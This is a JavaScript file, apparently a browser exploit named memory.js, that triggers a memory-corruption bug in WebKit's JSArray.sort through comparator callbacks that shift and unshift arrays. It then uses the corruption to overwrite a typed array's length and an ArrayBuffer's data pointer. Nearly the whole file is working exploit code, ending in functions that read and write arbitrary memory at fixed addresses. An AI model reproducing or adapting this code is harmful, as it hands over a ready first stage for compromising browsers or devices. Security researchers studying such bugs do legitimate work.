var _gc, _cnt = 0;
var uViews = new Array(10);
var uGCProtPtr = 0;
var uHeapPtr = 0;
var uMemPtr = 0;
var uMemInx = 0;
var indx = 0;
var uBuff;
function findValue(uMagicNum,u32,j){
		for (i=j; i < u32.length; i++) {
		if (i%50000==0){
		  logAdd("...");
		}
		
		if (u32[i]==uMagicNum) {
		logAdd("Found pointer for overwrite");
		return i
		}
		}
}
//NOTE: the following assume base addresses of views are all 0x82000000
function findValue32(uMagicNum,index){
		for (i=index; i < uViews[0].length; i++) {
		if (i%10000==0){
		  logAdd("Searching... 0x" + ((i*4)+0x82000000).toString(16).toUpperCase());
		}
		if (uViews[0][i]==uMagicNum) {
		  //logAdd("Found 0x" + uMagicNum.toString(16).toUpperCase() + " at " +i);
		return (i*4)+0x82000000
		}
		}
}

function findValue16(uMagicNum,index){
		for (i=index; i < uViews[1].length; i++) {
		if (i%100000==0){
		  logAdd("Searching... 0x" + ((i*2)+0x82000000).toString(16).toUpperCase());
		}
		if (uViews[1][i]==uMagicNum) {
		  logAdd("Found 0x" + uMagicNum.toString(16).toUpperCase() + " at " +i);
		return (i*2)+0x82000000
		}
		}
}

function findValue8(uMagicNum,index){
		for (i=index; i < uViews[2].length; i++) {
		if (i%100000==0){
		  logAdd("Searching... 0x" + (i+0x82000000).toString(16).toUpperCase());
		}
		if (uViews[2][i]==uMagicNum) {
		  logAdd("Found 0x" + uMagicNum.toString(16).toUpperCase() + " at " +i);
		return i+0x82000000
		}
		}
}     	    
function init()
{
	logAdd("Initializing memory access...");
	try {      	    
	    var u32 = new Uint32Array(8);
	    var a1 = [0,1,2,3,u32];	       
	    var a2 = [0,1,2,3,4]; // right after a1
	    var a1len = a1.length;
	    var a2len = a2.length;	
	    var u32len = u32.length;  
	    
		         	    
	    // protect local vars from GC	         	    
	    if (!_gc) _gc = new Array();
	    _gc.push(u32,a1,a2);   
	    var myCompFunc = function(x,y)
	    {  	    	
	    	if (y == 3 && x == u32) {  	
	    		a1.shift();
	    	}	    	    		
	    	return 0;
	    } 
	    
	    // call the vulnerable method - JSArray.sort(...)
	    a1.sort(myCompFunc);
	    // check results: a2.length should be overwritten by a1[4]   
	    var u32addr = a2.length;
	    //logAdd("Address of u32 = 0x" + u32addr.toString(16));
	    logAdd("...");
		if (u32addr == a2len) { logAdd("error: 1"); return 1; }
		myCompFunc = function(x,y)
		{
	    	if (y == 0 && x == 1) {  	
	    		a1.length = a1len;
	    		a1.shift();
	    		a2.length = u32addr + 0x28;
	    	}
	    	if (y == 3) {
	    		a1.unshift(0);
	    	}       		
	    	return 0;
	    } 
		a1.sort(myCompFunc);
		// now a1[3] should contain the corrupted JSValue from a2.length (=u32addr+0x28)
		var c = a2.length;
		if (c != u32addr + 0x28) { logAdd("error: 2"); a1[3] = 0; return 2; }
		var mo = {};
	    var pd = { get: function(){return 0;}, set: function(arg){return 0;}, enumerable:true, configurable:true }		
		var a3 = [0,1,2,a1[3]];
	    Object.defineProperty(mo, "prop0", pd);
	    for(var i=1; i < 7; i++){
	    	mo["prop"+i] = i;
	    }	
	    
	    // protect from GC
	    _gc.push(a3,mo,pd); 	
		
		myCompFunc = function(x,y)
		{  	
	    	if (y == 2) {
	    		a3.shift();
	    	}	     		
	    	return 0;
	    } 
	    a3.sort(myCompFunc);
	    a1[3] = 0; a3[3] = 0; 
	    u32.prop1 = 8; 	
	    u32.prop2 = 8; 
	    u32.prop3 = 8;	    
	    u32.prop4 = u2d(u32addr, u32addr+0x10); // ((GetterSetter)mo.prop0).m_structure
	      
		var f = new Function(" return 876543210 + " + (_cnt++) + ";");
  		f.prop2 = u2d(0xFFFFFFFF,0xFFFFFFFF); // a new value for u32.length
	    f();
	    pd.get = f;
	    Object.defineProperty(mo, "prop0", pd);	
		delete mo.prop0;
		
		// check results: u32.length is taken from f's internals
		//logAdd("u32 length = 0x" + u32.length.toString(16).toUpperCase());
		logAdd("...");
		
		if (u32.length == u32len) { logAdd("error: 3"); return 3; }
		
		uBuffer = new ArrayBuffer(0xABC0);
		var uView = new Uint32Array(uBuffer);
		uView[0]=0xBADDB055;
		//uLenIndx = findValue32(0xABC0,u32,0);
		uLenIndx = findValue(0xABC0,u32,0);
		
		//logAdd("Changing pointer to 0x"+uNewPtr.toString(16).toUpperCase());
		//assumption being uLenIndx - 1 is void* m_data
		//which it is.
		// :D
		uMemPtr = 0x82000000+((uLenIndx-1)*4);
		uMemInx = uLenIndx-1;
		var uOldPtr = u32[uLenIndx-1];
		u32[uLenIndx-1]=0x82000000;
		u32[uLenIndx]=u32.length;
		//logAdd("uBuffer length: 0x" + uBuffer.byteLength.toString(16).toUpperCase());
		logAdd("...");
		var uView32 = new Uint32Array(uBuffer);
		var uView16 = new Uint16Array(uBuffer);
		var uView8 = new Uint8Array(uBuffer);
		uViews[0]=uView32;
		uViews[1]=uView16;
		uViews[2]=uView8;
		uViews[3]=uBuffer;
		uGCProtPtr = uOldPtr;
		uHeapPtr = u32addr;
		uBuff = u32;
	}catch(e){
logAdd(e + " " + e.line);
}
}
init();
function setBase(len){
uBuff[uMemInx]=len;
}


function readbyte(){
try{
byt = uViews[2][indx];
indx++;
}catch(e){
logAdd(e);
byt = -1
}
return byt
}
function ReadByteFromAddr(i){
try{
byt = uViews[2][i-0x818e0000];
}catch(e){
logAdd(e);
byt = -1
}
return byt
}
function ReadInt16FromAddr(i){
try{
byt = uViews[1][(i-0x818e0000)/2];
}catch(e){
logAdd(e);
byt = -1
}
return byt
}
function ReadInt32FromAddr(i){
try{
byt = uViews[0][(i-0x818e0000)/4];
}catch(e){
logAdd(e);
byt = -1
}
return byt
}
function readZeroTruncString(addr){
i = ReadByteFromAddr(addr);
str = "";
while (i!== 00){
str += String.fromCharCode(i);
addr++;
i = ReadByteFromAddr(addr);
}
return str
}

function readMemory(addr,len)
{
var ret = new Array(len);
for (i=0;i<len;i++)
{
ret[i]=uViews[0][(addr-0x82000000)/4+i].toString(16);
}
return ret;
}
function writeMemory(addr,val)
{
uViews[0][(addr-0x82000000)/4]=val;
}


function getString(addr,len)
{
index = addr - 0x818e0000;
str = "";
byt = 0;
for (i=0; i<len; i++) {
byt = uViews[2][index+i];
str += String.fromCharCode(byt);
}
return str
}

logAdd("Loaded memory.js");